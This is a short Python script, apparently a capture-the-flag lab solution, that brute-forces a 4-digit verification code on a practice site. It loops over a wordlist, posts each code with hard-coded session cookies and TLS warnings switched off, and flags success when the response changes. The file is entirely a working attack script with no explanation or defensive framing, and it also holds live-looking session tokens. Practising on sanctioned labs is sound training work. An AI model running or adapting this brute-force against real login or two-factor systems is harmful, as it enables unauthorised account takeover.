import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = 'https://labs.matesctf.org/lab/auth/6/index.php?page=login'
code = 'https://labs.matesctf.org/lab/auth/6/index.php?page=verifyCode'

f_code = open("./wordlist/code_4.txt", "r").read().splitlines()
header = {
    "cookie" : "__cfduid=d8d51f1869479e5242217e2cf9138d1d41602516193; PHPSESSID=9765d58edb1eff8def93a16aa5e2304c; session=ad78d9f7-4249-4291-8485-bf4c40f47121.SpwhybcXBYzlLkinymyWZ1iCMzo"
}
data = {
    "username" : "peter",
    "password" : "matthew"
}
for co in f_code:
    x = requests.post(code, data={"code" : co} ,headers = header, allow_redirects=False)
    print("code is : " + co)
    if("code" not in x.text):
        print("====Success==== " + co  )